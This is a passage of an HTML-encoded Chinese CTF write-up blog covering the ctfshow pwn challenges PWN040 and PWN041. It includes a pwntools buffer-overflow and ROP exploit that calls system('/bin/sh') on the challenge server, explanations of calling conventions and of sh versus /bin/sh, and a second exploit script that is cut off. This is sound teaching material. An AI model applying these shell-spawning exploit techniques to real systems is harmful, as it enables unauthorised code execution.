&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28194&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400808&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4007e3&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x00000000004007e3 : pop rdi ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4004fe&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x00000000004004fe : ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ¬¸ä¸ºä»€ä¹ˆexpçš„payloadä¸­çš„å‚æ•°ä¸å¤ªä¸€æ ·ï¼Ÿ&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;h3 id=&#34;32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº&#34;&gt;&lt;strong&gt;32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;å³ä½¿æ€è·¯ä¸€æ ·ä½†æ¶æ„ä¸ä¸€æ ·ï¼Œåœ¨å†™payloadçš„æ—¶å€™æ³¨å…¥åœ°å€çš„é¡ºåºä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;32 ä½ç¨‹åºï¼ˆPWN039ï¼‰&lt;/strong&gt;ï¼š32 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚åœ¨ PWN039 é‡Œï¼Œ&lt;code&gt;system&lt;/code&gt;å‡½æ•°åœ°å€ç´§è·Ÿåœ¨å¡«å……æ•°æ®ä¹‹åï¼Œè¿™æ˜¯å› ä¸ºæº¢å‡ºåç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸º&lt;code&gt;system&lt;/code&gt;å‡½æ•°åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œ&lt;code&gt;system&lt;/code&gt;å‡½æ•°ã€‚åœ¨&lt;code&gt;payload = &#39;a&#39;*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)&lt;/code&gt;ä¸­ï¼Œ&lt;code&gt;&#39;a&#39;*(0x12 + 4)&lt;/code&gt;ç”¨äºå¡«å……ç¼“å†²åŒºå¹¶è¦†ç›–åŸè¿”å›åœ°å€ï¼Œ&lt;code&gt;p32(system)&lt;/code&gt;å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º&lt;code&gt;system&lt;/code&gt;å‡½æ•°åœ°å€ ï¼Œ&lt;code&gt;p32(0)&lt;/code&gt;æ˜¯ä¸ºäº†æ»¡è¶³æ ˆç»“æ„ï¼Œä½œä¸º&lt;code&gt;system&lt;/code&gt;å‡½æ•°æ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆå®é™…æ‰§è¡Œä¸­å¹¶ä¸é‡è¦ï¼Œå¯éšæ„å¡«å…… 4 å­—èŠ‚ï¼‰ï¼Œ&lt;code&gt;p32(bin_sh)&lt;/code&gt;åˆ™æ˜¯&lt;code&gt;system&lt;/code&gt;å‡½æ•°çš„å‚æ•°ï¼Œå³&lt;code&gt;/bin/sh&lt;/code&gt;å­—ç¬¦ä¸²çš„åœ°å€ã€‚è¿™æ ·çš„é¡ºåºç¬¦åˆ 32 ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚å’Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ç‰¹ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;64 ä½ç¨‹åºï¼ˆPWN40ï¼‰&lt;/strong&gt;ï¼š64 ä½ç¨‹åºçš„å‡½æ•°è°ƒç”¨è§„åˆ™æœ‰æ‰€ä¸åŒï¼Œå‰ 6 ä¸ªå‚æ•°ä¼˜å…ˆé€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾åœ¨&lt;code&gt;rdi&lt;/code&gt;å¯„å­˜å™¨ã€‚åœ¨ PWN40 ä¸­ï¼Œ&lt;code&gt;payload = &#39;a&#39;*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)&lt;/code&gt; ï¼Œ&lt;code&gt;&#39;a&#39;*(0xA + 8)&lt;/code&gt;ç”¨äºå¡«å……ç¼“å†²åŒºå’Œè¦†ç›–åŸè¿”å›åœ°å€ï¼›&lt;code&gt;p64(pop_rdi)&lt;/code&gt;å°†&lt;code&gt;pop_rdi&lt;/code&gt;æŒ‡ä»¤åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œæ‰§è¡Œ&lt;code&gt;pop_rdi&lt;/code&gt;æŒ‡ä»¤æ—¶ï¼Œä¼šæŠŠç´§è·Ÿå…¶åçš„&lt;code&gt;p64(bin_sh)&lt;/code&gt;ä¸­çš„&lt;code&gt;/bin/sh&lt;/code&gt;åœ°å€å¼¹å‡ºåˆ°&lt;code&gt;rdi&lt;/code&gt;å¯„å­˜å™¨ï¼Œä½œä¸º&lt;code&gt;system&lt;/code&gt;å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›&lt;code&gt;p64(ret)&lt;/code&gt;ç”¨äºæ ˆå¯¹é½ï¼ˆ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°å‰éœ€è¦ä¿è¯æ ˆ 16 å­—èŠ‚å¯¹é½ï¼Œ&lt;code&gt;ret&lt;/code&gt;æŒ‡ä»¤å¯è°ƒæ•´æ ˆæŒ‡é’ˆï¼‰ï¼›æœ€å&lt;code&gt;p64(system)&lt;/code&gt;å°†&lt;code&gt;system&lt;/code&gt;å‡½æ•°åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œä¼šè·³è½¬åˆ°&lt;code&gt;system&lt;/code&gt;å‡½æ•°æ‰§è¡Œï¼Œæ­¤æ—¶&lt;code&gt;rdi&lt;/code&gt;å¯„å­˜å™¨ä¸­å·²æ­£ç¡®è®¾ç½®äº†å‚æ•°&lt;code&gt;/bin/sh&lt;/code&gt;çš„åœ°å€ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_041&#34;&gt;PWN_041
&lt;/h3&gt;&lt;h4 id=&#34;é¢˜ç›®-1&#34;&gt;é¢˜ç›®ï¼š
&lt;/h4&gt;&lt;p&gt;32ä½çš„ system(); ä½†æ˜¯æ²¡&amp;quot;/bin/sh&amp;quot; ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_041&#34; &gt;PWN_041&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼Œç„¶åIDAåˆ†æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126.png&#34;
	width=&#34;1055&#34;
	height=&#34;206&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126_hu_50a6b7b4540d004f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126_hu_a5b594f7bf368fe2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;512&#34;
		data-flex-basis=&#34;1229px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¸èƒ½ç”¨ret2shellcodeäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå’Œä¸Šé¢˜å·®ä¸å¤šï¼Œæ‰¾ä¸€ä¸‹/bin/shï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123.png&#34;
	width=&#34;1550&#34;
	height=&#34;630&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123_hu_bbacdeabd557b527.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123_hu_7ec5c23639120ed9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;246&#34;
		data-flex-basis=&#34;590px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾ä¸åˆ°ï¼Œä½†æ‰¾åˆ°shï¼š&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;h4 id=&#34;binshå’Œshçš„æ ¸å¿ƒåŒºåˆ«&#34;&gt;&lt;strong&gt;/bin/shå’Œshçš„æ ¸å¿ƒåŒºåˆ«&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;å…³é”®åœºæ™¯ï¼šèƒ½å¦æ›¿ä»£å–å†³äºã€Œè°ƒç”¨å‡½æ•°çš„è¦æ±‚ã€&lt;/p&gt;
&lt;p&gt;PWN ä¸­æœ€å¸¸ç”¨çš„æ˜¯é€šè¿‡ &lt;code&gt;execveã€system&lt;/code&gt; å‡½æ•°æ‰§è¡Œ Shellï¼ˆå¦‚æ„é€  &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL)&lt;/code&gt; è·å¾—äº¤äº’æƒé™ï¼‰ï¼Œæ­¤å¤–ä¹Ÿå¯èƒ½æ¶‰åŠ &lt;code&gt;system&lt;/code&gt; å‡½æ•°ï¼Œä¸¤è€…å¯¹å‚æ•°çš„è¦æ±‚ä¸åŒï¼š&lt;/p&gt;
&lt;p&gt;åœºæ™¯ 1ï¼š&lt;code&gt;execve&lt;/code&gt; å‡½æ•°ï¼ˆå¿…é¡»ç”¨ç»å¯¹è·¯å¾„ï¼Œ&lt;code&gt;sh&lt;/code&gt; ä¸å¯æ›¿ä»£ &lt;code&gt;/bin/sh&lt;/code&gt;ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;execve&lt;/code&gt; æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨ï¼Œä½œç”¨æ˜¯åŠ è½½å¹¶æ‰§è¡Œæ–°ç¨‹åºï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°&lt;strong&gt;å¿…é¡»æ˜¯ç¨‹åºçš„ç»å¯¹è·¯å¾„&lt;/strong&gt;ï¼ˆæˆ–ç›¸å¯¹è·¯å¾„ï¼Œä½†ç»å¯¹è·¯å¾„æ˜¯ PWN ä¸­çš„å¸¸è§„é€‰æ‹©ï¼‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€ŒNo such file or directoryã€ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ­£ç¡®ç”¨æ³•ï¼š&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, ...)&lt;/code&gt;ï¼ˆç³»ç»Ÿç›´æ¥å®šä½åˆ° &lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œæ‰§è¡ŒæˆåŠŸï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;é”™è¯¯ç”¨æ³•ï¼š&lt;code&gt;execve(&amp;quot;sh&amp;quot;, ...)&lt;/code&gt;ï¼ˆç³»ç»Ÿä¸çŸ¥é“ &lt;code&gt;sh&lt;/code&gt; åœ¨å“ªé‡Œï¼Œä¼šéå† &lt;code&gt;$PATH&lt;/code&gt; æŸ¥æ‰¾ï¼Œä½† &lt;code&gt;execve&lt;/code&gt; ä¸æ”¯æŒé€šè¿‡ &lt;code&gt;$PATH&lt;/code&gt; è§£æå‘½ä»¤åï¼Œç›´æ¥å¤±è´¥ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å› æ­¤ï¼Œåœ¨æ„é€  &lt;code&gt;execve&lt;/code&gt; è°ƒç”¨æ—¶ï¼Œ&lt;strong&gt;åªèƒ½ç”¨ &lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œä¸èƒ½ç”¨ &lt;code&gt;sh&lt;/code&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœºæ™¯ 2ï¼š&lt;code&gt;system&lt;/code&gt; å‡½æ•°ï¼ˆ&lt;code&gt;sh&lt;/code&gt; å’Œ &lt;code&gt;/bin/sh&lt;/code&gt; æ•ˆæœä¸€è‡´ï¼Œå¯æ›¿ä»£ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;system&lt;/code&gt; å‡½æ•°çš„åº•å±‚é€»è¾‘æ˜¯ã€Œè°ƒç”¨ &lt;code&gt;/bin/sh -c&lt;/code&gt; æ¥æ‰§è¡Œå‚æ•°ä¸­çš„å‘½ä»¤ã€ï¼Œå…¶å‚æ•°æ”¯æŒã€Œå‘½ä»¤åã€æˆ–ã€Œç»å¯¹è·¯å¾„ã€ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è‹¥ä¼  &lt;code&gt;system(&amp;quot;sh&amp;quot;)&lt;/code&gt;ï¼š&lt;code&gt;system&lt;/code&gt; ä¼šè‡ªåŠ¨é€šè¿‡ &lt;code&gt;$PATH&lt;/code&gt; æ‰¾åˆ° &lt;code&gt;sh&lt;/code&gt;ï¼ˆå³ &lt;code&gt;/bin/sh&lt;/code&gt;ï¼‰ï¼Œç­‰ä»·äºæ‰§è¡Œ &lt;code&gt;/bin/sh -c sh&lt;/code&gt;ï¼Œæœ€ç»ˆå¯åŠ¨ Shellã€‚&lt;/li&gt;
&lt;li&gt;è‹¥ä¼  &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;ï¼šç­‰ä»·äºæ‰§è¡Œ &lt;code&gt;/bin/sh -c /bin/sh&lt;/code&gt;ï¼ŒåŒæ ·å¯åŠ¨ Shellã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å› æ­¤ï¼Œåœ¨ä½¿ç”¨ &lt;code&gt;system&lt;/code&gt; å‡½æ•°æ—¶ï¼Œ&lt;strong&gt;&lt;code&gt;sh&lt;/code&gt; å’Œ &lt;code&gt;/bin/sh&lt;/code&gt; æ•ˆæœå®Œå…¨ä¸€è‡´ï¼Œå¯ä»¥äº’ç›¸æ›¿ä»£&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç‰¹æ®Šæƒ…å†µ&lt;/strong&gt;ï¼šç¯å¢ƒå˜é‡ &lt;code&gt;$PATH&lt;/code&gt; è¢«ç¯¡æ”¹ï¼ˆ&lt;code&gt;sh&lt;/code&gt; å¯èƒ½å¤±æ•ˆï¼Œ&lt;code&gt;/bin/sh&lt;/code&gt; æ›´å¯é ï¼‰&lt;/p&gt;
&lt;p&gt;è™½ç„¶å¤šæ•°æƒ…å†µä¸‹ &lt;code&gt;$PATH&lt;/code&gt; åŒ…å« &lt;code&gt;/bin&lt;/code&gt;ï¼Œä½†å¦‚æœç›®æ ‡ç¨‹åºè¿è¡Œæ—¶ç¯¡æ”¹äº† &lt;code&gt;$PATH&lt;/code&gt;ï¼ˆå¦‚åˆ é™¤ &lt;code&gt;/bin&lt;/code&gt; ç›®å½•ï¼‰ï¼Œæ­¤æ—¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨ &lt;code&gt;sh&lt;/code&gt; ä¼šå›  &lt;code&gt;$PATH&lt;/code&gt; ä¸­æ‰¾ä¸åˆ° &lt;code&gt;sh&lt;/code&gt; è€Œå¤±è´¥ï¼›&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;/bin/sh&lt;/code&gt; å› æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¸å— &lt;code&gt;$PATH&lt;/code&gt; å½±å“ï¼Œä¾ç„¶èƒ½æˆåŠŸæ‰§è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PWN åˆ©ç”¨ä¸­ä¸ºäº†ã€Œå…¼å®¹æ€§å’Œç¨³å®šæ€§ã€ï¼Œå³ä½¿æ˜¯ &lt;code&gt;system&lt;/code&gt; å‡½æ•°ï¼Œä¹Ÿæ›´æ¨èå†™ &lt;code&gt;/bin/sh&lt;/code&gt; è€Œé &lt;code&gt;sh&lt;/code&gt;ï¼ˆé¿å…å› ç¯å¢ƒå˜é‡å¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™é‡Œè·Ÿè¿›hintå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125.png&#34;
	width=&#34;838&#34;
	height=&#34;150&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125_hu_2475afccf8340c50.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125_hu_f610554b4ea5f28d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;558&#34;
		data-flex-basis=&#34;1340px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°è¿™æœ‰ç°æˆçš„systemå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è°ƒç”¨shå»è¿›è¡Œææƒã€‚&lt;/p&gt;
&lt;p&gt;çŸ¥é“äº†shåœ°å€æ˜¯0x80487BAï¼Œå°±å¯ä»¥å†™expäº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28261&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
